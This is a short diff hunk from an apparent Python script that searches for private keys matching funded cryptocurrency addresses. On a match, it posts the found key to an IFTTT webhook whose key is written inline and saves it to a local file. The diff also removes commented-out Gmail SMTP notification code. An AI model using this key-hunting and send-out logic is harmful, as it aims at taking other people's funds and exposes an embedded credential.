@@ -62,14 +62,6 @@ def seek(r, df_handler):
 				if pub in line:
 					msg = "\nPublic: " + str(pub) + " ---- Private: " + str(priv) + "YEI"
 					text = msg
-					#UNCOMMENT IF 2FA from gmail is activated, or risk missing your winning ticket;)
-					#server = smtplib.SMTP("smtp.gmail.com", 587)
-					#server.ehlo()
-					#server.starttls()
-					#server.login("example@gmail.com", "password")
-					#fromaddr = "example@gmail.com"
-					#toaddr = "example@gmail.com"
-					#server.sendmail(fromaddr, toaddr, text)
 					print(text)
 					requests.post(url="https://maker.ifttt.com/trigger/hmbt/with/key/d8gr-cI50XXn1WSEOHf64W", data={ 'value1' : 'P', 'value2' : fullkey, 'value3' : 'R3'})
 					with open('Wallets.txt','a') as f:
